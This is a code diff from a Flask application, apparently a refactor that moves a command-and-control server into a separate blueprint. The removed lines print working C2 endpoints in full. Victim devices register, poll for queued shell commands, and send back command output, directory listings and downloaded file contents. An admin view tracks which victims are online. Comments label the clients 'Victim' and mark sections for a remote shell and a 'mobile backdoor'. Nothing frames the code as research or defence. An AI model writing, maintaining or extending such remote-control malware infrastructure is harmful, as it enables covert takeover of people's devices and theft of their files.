@@ -32,6 +32,7 @@ from app.state import (
     CONFIG,
     LOGIN_FAILS as _LOGIN_FAILS,
     ANALYTICS,
+    C2_SESSIONS, C2_COMMANDS, C2_RESPONSES, C2_FILE_LISTS, C2_DOWNLOADS,
     load_php_config,
     load_check_c,
     save_check_c,
@@ -120,9 +121,6 @@ def legacy_assets(filename):
 
 
 # Global C2 State (In-memory for simplicity)
-C2_SESSIONS = {}
-C2_COMMANDS = {}
-C2_RESPONSES = {}
 
 
 # P3.1: moved to app.blueprints.auth -> @index ('/')
@@ -598,186 +596,24 @@ def terminal_exec():
 
 # ===== C2 / REMOTE SHELL ENDPOINTS =====
 
-@app.route('/api/c2/register', methods=['POST'])
-def c2_register():
-    data = request.json
-    uid = data.get('uid')
-    info = data.get('info', {})
+# P3.3: moved to app.blueprints.capture_c2 -> @c2_register ('/api/c2/register')
 
-    if not uid:
-        return jsonify({'error': 'No uid provided'}), 400
+# P3.3: moved to app.blueprints.capture_c2 -> @c2_poll ('/api/c2/poll')
 
-    C2_SESSIONS[uid] = {
-        'last_seen': datetime.now().isoformat(),
-        'info': info,
-        'ip': request.remote_addr
-    }
+# P3.3: moved to app.blueprints.capture_c2 -> @c2_response ('/api/c2/response')
+# P3.3: moved to app.blueprints.capture_c2 -> @c2_list_clients ('/api/c2/clients')
 
-    # Persist so the client list survives a server restart
-    db.save_c2_session(uid, info, request.remote_addr)
-    
-    # Initialize queues if new
-    if uid not in C2_COMMANDS:
-        C2_COMMANDS[uid] = []
-    if uid not in C2_RESPONSES:
-        C2_RESPONSES[uid] = []
-        
-    return jsonify({'status': 'registered'})
+# P3.3: moved to app.blueprints.capture_c2 -> @c2_queue_command ('/api/c2/queue_command')
 
-@app.route('/api/c2/poll', methods=['POST'])
-def c2_poll():
-    data = request.json
-    uid = data.get('uid')
+# P3.3: moved to app.blueprints.capture_c2 -> @c2_get_responses ('/api/c2/get_responses/<uid>')
 
-    if not uid:
-        return jsonify({'error': 'No uid provided'}), 400
+# P3.3: moved to app.blueprints.capture_c2 -> @c2_get_file_list ('/api/c2/get_file_list/<uid>')
 
-    if uid in C2_SESSIONS:
-        C2_SESSIONS[uid]['last_seen'] = datetime.now().isoformat()
+# P3.3: moved to app.blueprints.capture_c2 -> @c2_get_download ('/api/c2/get_download/<uid>')
 
-    # Keep the persisted record fresh too
-    db.update_c2_last_seen(uid)
-        
-    # Check for commands
-    if uid in C2_COMMANDS and len(C2_COMMANDS[uid]) > 0:
-        cmd = C2_COMMANDS[uid].pop(0)
-        return jsonify({'command': cmd})
-        
-    return jsonify({'command': None})
+# P3.3: moved to app.blueprints.capture_c2 -> @c2_file_list_response ('/api/c2/file_list_response')
 
-@app.route('/api/c2/response', methods=['POST'])
-def c2_response():
-    data = request.json
-    uid = data.get('uid')
-    output = data.get('output')
-
-    if not uid:
-        return jsonify({'error': 'No uid provided'}), 400
-
-    if uid in C2_SESSIONS:
-        C2_SESSIONS[uid]['last_seen'] = datetime.now().isoformat()
-    
-    if uid not in C2_RESPONSES:
-        C2_RESPONSES[uid] = []
-        
-    C2_RESPONSES[uid].append({
-        'timestamp': datetime.now().isoformat(),
-        'output': output
-    })
-    
-    return jsonify({'status': 'received'})
-
-# Admin APIs for Dashboard
-@app.route('/api/c2/clients')
-def c2_list_clients():
-    # Filter active clients (seen in last 60 seconds)
-    active = []
-    now = datetime.now()
-
-    # Merge persisted sessions (survive a server restart)
-    for uid, db_session in db.get_all_c2_sessions().items():
-        if uid not in C2_SESSIONS:
-            C2_SESSIONS[uid] = db_session
-
-    for uid, sess in C2_SESSIONS.items():
-        if not uid:
-            # Skip corrupt sessions that have no uid
-            continue
-        # Calculate time diff
-        try:
-            last = datetime.fromisoformat(sess['last_seen'])
-            delta = (now - last).total_seconds()
-            status = 'online' if delta < 20 else 'offline'
-        except:
-            status = 'offline'
-            
-        active.append({
-            'uid': uid,
-            'ip': sess['ip'],
-            'info': sess['info'],
-            'status': status,
-            'last_seen': sess['last_seen']
-        })
-    return jsonify({'clients': active})
-
-@app.route('/api/c2/queue_command', methods=['POST'])
-def c2_queue_command():
-    data = request.json
-    uid = data.get('uid')
-    cmd = data.get('cmd')
-    
-    if uid not in C2_COMMANDS:
-        C2_COMMANDS[uid] = []
-        
-    C2_COMMANDS[uid].append(cmd)
-    return jsonify({'status': 'queued'})
-
-@app.route('/api/c2/get_responses/<uid>')
-def c2_get_responses(uid):
-    if uid in C2_RESPONSES:
-        resps = C2_RESPONSES[uid]
-        # Clear after reading to act like a stream
-        C2_RESPONSES[uid] = []
-        return jsonify({'responses': resps})
-    return jsonify({'responses': []})
-
-# File Manager Endpoints
-C2_FILE_LISTS = {}
-C2_DOWNLOADS = {}
-
-@app.route('/api/c2/get_file_list/<uid>')
-def c2_get_file_list(uid):
-    if uid in C2_FILE_LISTS:
-        file_data = C2_FILE_LISTS[uid]
-        # Clear after reading
-        del C2_FILE_LISTS[uid]
-        return jsonify(file_data)
-    return jsonify({'files': None})
-
-@app.route('/api/c2/get_download/<uid>')
-def c2_get_download(uid):
-    if uid in C2_DOWNLOADS:
-        file_data = C2_DOWNLOADS[uid]
-        # Clear after reading
-        del C2_DOWNLOADS[uid]
-        return jsonify(file_data)
-    return jsonify({'file': None})
-
-@app.route('/api/c2/file_list_response', methods=['POST'])
-def c2_file_list_response():
-    """Victim sends file list back"""
-    data = request.json
-    uid = data.get('uid')
-    files = data.get('files')
-    path = data.get('path')
-    
-    if uid:
-        C2_FILE_LISTS[uid] = {
-            'files': files,
-            'path': path
-        }
-    
-    return jsonify({'status': 'received'})
-
-@app.route('/api/c2/file_download_response', methods=['POST'])
-def c2_file_download_response():
-    """Victim sends file content back"""
-    data = request.json
-    uid = data.get('uid')
-    content = data.get('content')
-    filename = data.get('filename')
-    
-    if uid:
-        C2_DOWNLOADS[uid] = {
-            'file': {
-                'content': content,
-                'filename': filename
-            }
-        }
-    
-    return jsonify({'status': 'received'})
-
-
+# P3.3: moved to app.blueprints.capture_c2 -> @c2_file_download_response ('/api/c2/file_download_response')
 # ===== MOBILE BACKDOOR ENDPOINTS =====
 
 # Global Mobile State
